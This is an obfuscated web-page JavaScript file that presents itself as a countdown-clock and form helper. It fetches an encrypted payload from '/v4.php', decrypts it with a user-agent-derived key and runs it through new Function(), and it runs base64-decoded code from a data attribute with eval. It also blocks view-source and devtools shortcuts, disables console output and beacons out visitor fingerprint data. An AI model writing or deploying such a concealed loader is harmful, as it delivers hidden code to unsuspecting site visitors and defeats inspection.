function S(e, n, t, r) {
    return x(n - '0x355', r);
}
function formtojson(e) {
    function n(e, n, t, r) {
        return x(n - -931, r);
    }
    $[n(0, -480, 0, -529)](e, function (x, e) {
        t[e[function (x, e, t, r) {
            return n(0, x - '0x220', 0, r);
        }('0x91', 0, 0, '0x62')]] = e[function (x, e, t, r) {
            return n(0, x - '0x6f', 0, r);
        }(-371, 0, 0, -302)];
    });
    return t;
}
!function (e, n) {
    var t = l();
    function r(e, n, t, r) {
        return x(e - '0x332', r);
    }
    function o(e, n, t, r) {
        return x(e - '0x266', t);
    }
    for (;;)
        try {
            if (996204 === parseInt(o('0x451', 0, '0x448')) / 1 * (-parseInt(o('0x46e', 0, '0x480')) / 2) + parseInt(r('0x4f7', 0, 0, '0x53c')) / 3 + -parseInt(r('0x52d', 0, 0, '0x554')) / 4 * (-parseInt(o('0x43b', 0, '0x40b')) / 5) + -parseInt(r('0x544', 0, 0, '0x511')) / 6 + parseInt(o('0x464', 0, '0x42e')) / 7 * (parseInt(r('0x52b', 0, 0, '0x537')) / 8) + -parseInt(r('0x51f', 0, 0, '0x503')) / 9 + -parseInt(r('0x551', 0, 0, '0x58b')) / 10 * (-parseInt(r('0x525', 0, 0, '0x566')) / 11)) {
                break;
            }
            t.push(t.shift());
        } catch (x) {
            t.push(t.shift());
        }
}();
var crc32 = function (e) {
    function n(e, n, t, r) {
        return x(n - '0xf5', r);
    }
    for (var t, r = [], o = 0; o < 256; o++) {
        t = o;
        for (var a = 0; a < 8; a++)
            t = 1 & t ? 3988292384 ^ t >>> 1 : t >>> 1;
        r[o] = t;
    }
    for (var c = -1, f = 0; f < e[n(0, '0x312', 0, '0x2fa') + 'h']; f++)
        c = c >>> 8 ^ r[255 & (c ^ e[n(0, '0x2dc', 0, '0x2d3') + i('0x5b', '0x6c', '0x58', '0x5b')](f))];
    function i(e, n, t, r) {
        return x(t - -433, e);
    }
    return (-1 ^ c) >>> 0;
};

function c_hash(e) {
    function n(e, n, t, r) {
        return x(n - -412, t);
    }
    let t = 0;
    for (let x = 0; x < e[n(0, '0x81', '0x73') + 'h']; ++x)
        t += Math[n(0, '0x94', '0xc6')](e[x]);
    return t;
}
function sectoparts(e) {
    function n(e, n, t, r) {
        return x(r - '0x1e', e);
    }
    return [
        Math[n('0x20b', 0, 0, '0x23e')](e / 31536000),
        Math.floor(e % 31536000 / 86400),
        Math[t = '0x242', r = '0x1ff', x(t - '0x22', r)](e % 31536000 % 86400 / 3600),
        Math[n('0x20a', 0, 0, '0x23e')](e % 31536000 % 86400 % 3600 / 60),
        e % 31536000 % 86400 % 3600 % 60
    ];
    var t;
    var r;
}
function check_for_clocks() {
    function g(e, n, t, r) {
        return x(e - -313, r);
    }
    function M(e, n, t, r) {
        return x(n - -817, e);
    }
    $(M(-257, -306, -301, -306) + '-clock]')[M(-364, -366, -339, -335)]((z, t) => {
        var T = $(t)[e(-164, -235, -193, -246)](P('0x233', '0x1fd', '0x1ee', '0x22d'));
        function P(x, e, n, t) {
            return M(n, t - '0x381', n - '0x16b', t - '0x154');
        }
        function e(x, e, n, t) {
            return M(t, n - '0x58', n - '0x19a', t - '0x97');
        }
        if (void 0 !== window[P('0x2d6', '0x270', '0x2b9', '0x29a') + 'ks'][T]) {
            console[P('0x235', '0x22a', '0x277', '0x23f')](e(-207, -189, -158, -139) + e(-146, -197, -189, -224) + P('0x221', '0x20f', '0x246', '0x244'));
            clearInterval(window[P('0x28c', '0x28e', '0x2a0', '0x29a') + 'ks'][T]);
            delete window[e(-202, -200, -143, -144) + 'ks'][T];
        }
        window[e(-106, -198, -143, -171) + 'ks'][T] = setInterval((c, D, n, V) => {
            function i(x, n, t, r) {
                return e(x - '0x118', n - '0xc8', r - -190, x);
            }
            function k(x, e, n, t) {
                return P(x - '0x65', e - '0x135', n, t - '0xbd');
            }
            try {
                if (!$(k('0x30f', '0x2e0', '0x30a', '0x30c') + '-cloc' + k('0x2af', '0x2db', '0x29f', '0x2dc') + c + '"]')[k('0x344', '0x354', '0x32d', '0x32a') + 'h']) {
                    throw new Error(i(-366, -429, -398, -360) + 'nt_no' + k('0x2a4', '0x2e7', '0x2ec', '0x2d4') + 'nd');
                }
                var R = n - Math[k('0x341', '0x355', '0x335', '0x32d')](Date[i(-398, -374, -284, -345)]() / 1000) + D;
                var K = sectoparts(R);
                if (K[i(-482, -416, -400, -467) + 'ch']((x, e) => {
                        function n(x, e, n, t) {
                            return i(n, e - '0x6e', n - '0x1bd', x - '0x687');
                        }
                        var t = {
                            0: r('0x570', '0x533', '0x53c', '0x52f'),
                            1: 'day',
                            2: r('0x55f', '0x597', '0x553', '0x556'),
                            3: n('0x4c8', '0x4b1', '0x4a5'),
                            4: 'sec'
                        };
                        function r(x, e, n, t) {
                            return k(x - '0xd', e - '0xb3', n, t - '0x218');
                        }
                        if ($('#' + t[e], V).length > 0) {
                            x = x[n('0x516', '0x547', '0x4f9') + r('0x57d', '0x565', '0x574', '0x54e')]()[r('0x599', '0x543', '0x578', '0x55b') + 'art'](2, '0');
                            $('#' + t[e], V).html(x);
                        }
                    }), K[0] <= 0 && K[1] <= 0 && K[2] <= 0 && K[3] <= 0 && K[4] <= 0) {
                    throw void 0 !== $(V)[k('0x343', '0x31c', '0x336', '0x325')]('callb' + k('0x2b3', '0x2b1', '0x31e', '0x2d8')) && eval(atob($(V)[i(-328, -384, -334, -383)]('callb' + k('0x30c', '0x2f6', '0x308', '0x2d8')))), new Error(k('0x30e', '0x2af', '0x2d1', '0x2ee') + 'up');
                }
            } catch (x) {
                console[k('0x2de', '0x2f6', '0x2e4', '0x2fc')](k('0x35f', '0x366', '0x328', '0x347') + 'oy', x);
                clearInterval(window[i(-297, -281, -302, -333) + 'ks'][c]);
                delete window[i(-340, -267, -385, -333) + 'ks'][c];
            }
        }, 10, T, $(t).data(P('0x271', '0x225', '0x219', '0x255')), Math[P('0x270', '0x232', '0x2a0', '0x270')](Date[e(-177, -129, -155, -221)]() / 1000), t);
    });
}

function j(e, n, t, r) {
    return x(r - '0x1bf', n);
}
function l() {
    var x = [
        '955QdhIPZ',
        'old">',
        'br><s',
        'min',
        'getEl',
        'ass="',
        'onloa',
        'text/',
        'clock',
        'gify',
        'Malfo',
        ' try ',
        'time_',
        'dange',
        'reloa',
        'h3>Er',
        'brows',
        '<hr>',
        'charC',
        'h2 cl',
        'erent',
        'rmed ',
        '726737ynfPku',
        'ror<b',
        '76662rGSDAj',
        'em, p',
        'log',
        'plain',
        'reque',
        'our b',
        '63151bdCgSy',
        'nning',
        'r fon',
        'scree',
        't-mut',
        'r>Ple',
        '689824gxMiSw',
        'nseTe',
        '22492IGTKBS',
        'match',
        'reduc',
        '7CSFsEu',
        '[data',
        'ate y',
        'as a ',
        'ain l',
        'class',
        'gent',
        'time',
        'try a',
        '_log_',
        '2KndhMW',
        'odeAt',
        'year',
        '</h2>',
        '(.{',
        't-wei',
        'split',
        'Utf8',
        'eacon',
        'join',
        '9691104rFXCUA',
        'down',
        'name',
        'repla',
        'll><h',
        'onkey',
        'data',
        'harCo',
        '/h3><',
        'width',
        'dy_ru',
        'lengt',
        '#msg',
        '2790PoEqCw',
        'floor',
        'er_up',
        'v101',
        'ById',
        'UTF-8',
        'POST',
        'toStr',
        'parse',
        '<hr><',
        'ing',
        'text-',
        'rever',
        'Pleas',
        '.</h3',
        'atob',
        'eleme',
        'abs',
        'hour',
        ' data',
        'keyCo',
        '#load',
        'date',
        'padSt',
        'warn',
        ' diff',
        'h3>Th',
        'destr',
        'alrea',
        'enc',
        'encry',
        'now',
        'fromC',
        'messa',
        'HTML',
        'inner',
        'respo',
        '</sma',
        '101',
        'error',
        ' one.',
        'MD5',
        'probl',
        'bcloc',
        'ght-b',
        'value',
        'pop',
        'each',
        'forEa',
        '1754049gUtCpb',
        'userA',
        't_fou',
        'subst',
        'ror',
        'strin',
        'ack',
        'ry ag',
        'stack',
        'sText',
        'k="',
        'rowse',
        'show',
        'setIt',
        'statu',
        'hide'
    ];
    return (l = function () {
        return x;
    })();
}
function x(e, n) {
    var t = l();
    return (x = function (x, e) {
        return t[x -= 449];
    })(e, n);
}
function closest(e, n) {
    function t(e, n, t, r) {
        return x(e - -255, t);
    }
    for (var r = n[0], o = Math[function (e, n, t, r) {
                return x(e - '0x10a', t);
            }('0x33a', 0, '0x357')](e - r), a = 0; a < n[t('0x11e', 0, '0x141') + 'h']; a++) {
        var c = Math[t('0x131', 0, '0x10f')](e - n[a]);
        if (c < o) {
            o = c;
            r = n[a];
        }
    }
    return r;
}

function hsipdxdcej() {
    function e(e, n, t, r) {
        return x(e - -140, n);
    }
    $(e('0x1a8', '0x1ce') + e('0x19d', '0x1c1'))[e('0x148', '0x163')]();
    $(e('0x192', '0x197'))[e('0x148', '0x12d')]();
}
function askkkdsanxc(e) {
    function n(e, n, t, r) {
        return x(n - -443, t);
    }
    var t;
    var r;
    document[t = '0x9', r = -38, x(t - -464, r) + 'ement' + n(0, '0x68', '0x6b')]('msg')[n(0, '0x87', '0x44') + n(0, '0x86', '0x52')] = e;
    $(n(0, '0x63', '0x24')).show();
}
function client_log(e) {
    function n(e, n, t, r) {
        return x(r - '0x357', e);
    }
    function t(e, n, t, r) {
        return x(r - -606, e);
    }
    const r = {
        msg: e,
        device: window.device
    };
    navigator['sendB' + n('0x55d', 0, 0, '0x567')]('e', new Blob([CryptoJS.AES[n('0x5ac', 0, 0, '0x594') + 'pt'](JSON['strin' + t(-123, 0, 0, -128)](r), t(-4, 0, 0, -24) + t(-120, 0, 0, -87) + t(-2, 0, 0, -60), { format: CryptoJSAesJson })[t(-87, 0, 0, -56) + t(-24, 0, 0, -53)]()], { type: t(-103, 0, 0, -130) + n('0x50f', 0, 0, '0x547') }));
}
function zxndnnndje(e) {
    function n(e, n, t, r) {
        return x(n - -865, e);
    }
    function t(e, n, t, r) {
        return x(e - -349, r);
    }
    hsipdxdcej();
    $('#load' + n(-357, -312))[n(-401, -400)]();
    $.ajax({
        type: n(-311, -316),
        url: location.origin + '/v4.php?s=' + btoa(String[t('0xe2', 0, 0, '0xa2') + t('0xbc', 0, 0, '0xf8') + 'de'](CryptoJS[n(-318, -281)](JSON[n(-412, -407) + t('0x81', 0, 0, '0x90')](e))[t('0xc9', 0, 0, '0xf1') + n(-286, -312)]()[n(-394, -357)](/\d+/g).join('')[t('0xb1', 0, 0, '0x70')]('')[t('0xa0', 0, 0, '0x6c') + 'e']((x, e) => parseInt(x) + parseInt(e), 0)[n(-333, -315) + t('0xcc', 0, 0, '0xb7')]()), 1).replace(/=+$/, ''),
        data: e,
        headers: JSON[n(-274, -314)](localStorage.h),
        success: function (x) {
            function t(x, e, t, r) {
                return n(r, t - '0x5f0');
            }
            function r(x, e, t, r) {
                return n(t, x - '0x27b');
            }
            hsipdxdcej();
            try {
                var o = JSON[t(0, 0, '0x4b6', '0x4b1')](x);
                o.s = obb1(o.s);
                var a = atob(JSON.parse(CryptoJS.AES.decrypt(JSON[r('0xe4', 0, '0x10d') + t(0, 0, '0x46d', '0x49e')](o), localStorage.i, { format: CryptoJSAesJson })['toStr' + t(0, 0, '0x4b8', '0x4c8')](CryptoJS[r('0x156', 0, '0x18b')][t(0, 0, '0x49e', '0x4d1')]))[0]);
                new Function(a)();
            } catch (x) {
                if (r('0xf9', 0, '0xfa') + r('0x104', 0, '0x10e') + t(0, 0, '0x4b3', '0x4d6') + t(0, 0, '0x4c1', '0x4da') == x[r('0x15a', 0, '0x19e') + 'ge']) {
                    client_log(c = {
                        type: t(0, 0, '0x474', '0x45a') + r('0x13b', 0, '0x110') + t(0, 0, '0x4c4', '0x4e1'),
                        js_user_agent: navigator[r('0xe0', 0, '0xb1') + t(0, 0, '0x493', '0x487')],
                        screen_width: window[r('0x110', 0, '0x11e') + 'n'][r('0x135', 0, '0x13f')],
                        screen_height: window[t(0, 0, '0x485', '0x457') + 'n'].height
                    });
                    askkkdsanxc(r('0x142', 0, '0x141') + r('0x102', 0, '0x11c') + t(0, 0, '0x469', '0x437') + r('0x144', 0, '0x140') + t(0, 0, '0x471', '0x44c') + t(0, 0, '0x484', '0x496') + t(0, 0, '0x49c', '0x4ca') + r('0x165', 0, '0x197') + t(0, 0, '0x465', '0x483') + r('0x146', 0, '0x138') + 'e upd' + r('0x11a', 0, '0x127') + t(0, 0, '0x481', '0x447') + t(0, 0, '0x45f', '0x48f') + 'r or ' + r('0x120', 0, '0x152') + r('0x152', 0, '0x12b') + r('0x103', 0, '0xe6') + t(0, 0, '0x4d6', '0x4d8') + t(0, 0, '0x49a', '0x4da') + r('0x100', 0, '0xc8'));
                } else {
                    var c = {
                        error: x.stack,
                        post: e,
                        res_dec: a
                    };
                    askkkdsanxc('<hr><' + t(0, 0, '0x473', '0x472') + r('0x106', 0, '0x11c') + r('0x112', 0, '0x120') + 'ase t' + t(0, 0, '0x45b', '0x47f') + r('0x11c', 0, '0x13b') + 'ater<' + t(0, 0, '0x4a9', '0x46e') + t(0, 0, '0x466', '0x44b') + 'mall ' + r('0x11d', 0, '0x15d') + '="tex' + r('0x111', 0, '0x153') + 'ed">' + x[t(0, 0, '0x45c', '0x433')] + (r('0x15e', 0, '0x194') + t(0, 0, '0x4a5', '0x49a')) + 'r>');
                    client_log(c);
                }
            }
        },
        error: function (x, e) {
            function r(x, e, n, r) {
                return t(n - '0x92', 0, 0, e);
            }
            function o(x, e, t, r) {
                return n(e, t - '0x48c');
            }
            var a = JSON[o(0, '0x2d2', '0x2f5') + o(0, '0x2eb', '0x309')]({
                0: x[o(0, '0x2d0', '0x2fe') + 's'],
                1: x[o(0, '0x31c', '0x2fe') + r(0, '0xdb', '0x103')],
                2: x[o(0, '0x3aa', '0x36e') + o(0, '0x35c', '0x325') + 'xt']
            });
            if (0 !== x[r(0, '0x13f', '0x108') + 's']) {
                client_log([
                    o(0, '0x2d6', '0x31c') + 'st_er' + o(0, '0x30d', '0x2f4'),
                    a
                ]);
            }
            hsipdxdcej();
            askkkdsanxc(o(0, '0x35c', '0x353') + r(0, '0x14a', '0x16e') + 'ere w' + r(0, '0xfc', '0x136') + r(0, '0x1b4', '0x17e') + o(0, '0x336', '0x319') + 'lease' + o(0, '0x343', '0x30b') + 'again' + r(0, '0x128', '0x162') + '>' + x[o(0, '0x33d', '0x2fe') + 's'] + '|' + x[o(0, '0x2db', '0x2fe') + 'sText'] + r(0, '0x114', '0x11b'));
        }
    });
}

function obb1(e) {
    function n(e, n, t, r) {
        return x(r - -998, n);
    }
    let t = parseInt(e[r('0x539', '0x566', '0x54f', '0x561') + 'r'](-7, 1) + e[r('0x591', '0x574', '0x598', '0x561') + 'r'](6, 1));
    function r(e, n, t, r) {
        return x(r - '0x399', e);
    }
    e = e[r('0x569', '0x51d', '0x53b', '0x561') + 'r'](0, 6) + e.substr(7, e.length - 14) + e[n(0, -594, 0, -542) + 'r'](e[r('0x592', '0x5c2', '0x590', '0x5b6') + 'h'] - 6);
    var o = new RegExp(r('0x572', 0, 0, '0x5a5') + e[r('0x5ea', 0, 0, '0x5b6') + 'h'] / t + '})', 'g');
    let a = e.replace(o, '$1|')[r('0x5ea', 0, 0, '0x5a7')]('|');
    for (a[r('0x593', 0, 0, '0x55b')](); a[0][r('0x5b3', 0, 0, '0x5a7')]('')[n(0, -398, 0, -457) + 'h'] > 1;)
        for (let x = 0; x < a[n(0, -492, 0, -457) + 'h']; x++)
            a[x] = a[x][n(0, -537, 0, -472)]('')[r('0x5bc', 0, 0, '0x5c4') + 'se']().join(''), a[x] = window[n(0, -454, 0, -440)](a[x]), a[x] = a[x][n(0, -478, 0, -465) + 'ce']('=', '');
    return a[r('0x5c3', 0, 0, '0x5aa')]('');
}


if (void 0 === window.bclocks) {
    window.bclocks = [];
}
localStorage[j('0x3d1', '0x38b', '0x3ad', '0x391') + 'em']('i', CryptoJS[S('0x56b', '0x59d', '0x559', '0x573')](navigator['userA' + j('0x382', '0x3d7', '0x3f9', '0x3c3')])[j('0x3de', '0x3d2', '0x41a', '0x3e5') + 'ing']()[S('0x4f8', '0x51d', '0x4f4', '0x545') + 'r'](5, 10));
localStorage[S('0x534', '0x527', '0x515', '0x55d') + 'em']('h', JSON[S('0x506', '0x51f', '0x548', '0x4fb') + j('0x374', '0x3d7', '0x36f', '0x39d')]({ v: j('0x3e7', '0x422', '0x3e0', '0x404') }));
window[j('0x37f', '0x3d7', '0x392', '0x39a') + 'd'] = function () {
    setTimeout(function () {
        zxndnnndje();
    }, 1000);
};
document[S('0x56d', '0x56c', '0x584', '0x527') + j('0x3fb', '0x3f5', '0x3b3', '0x3d2')] = function (x) {
    function e(x, e, n, t) {
        return S(x - '0x2c', x - -1385, n - '0x7', n);
    }
    return !x.ctrlKey || 85 !== x.keyCode && 117 !== x[e('0x1f', 0, -29) + 'de'] && 73 !== x[e('0x1f', 0, '0x1d') + 'de'] && 74 !== x[e('0x1f', 0, '0x1b') + 'de'];
};
setTimeout(function () {
    var x;
    var e;
    var n;
    location[x = '0x270', e = '0x2d8', n = '0x2a8', S(x - '0x6d', n - -656, n - '0x1e3', e) + 'd']();
}, 3600000);
console[S('0x504', '0x544', '0x52f', '0x50a')] = function () {
};
console[S('0x586', '0x58c', '0x5cd', '0x548')] = function () {
};
console[S('0x561', '0x59b', '0x5cd', '0x5a3')] = function () {
};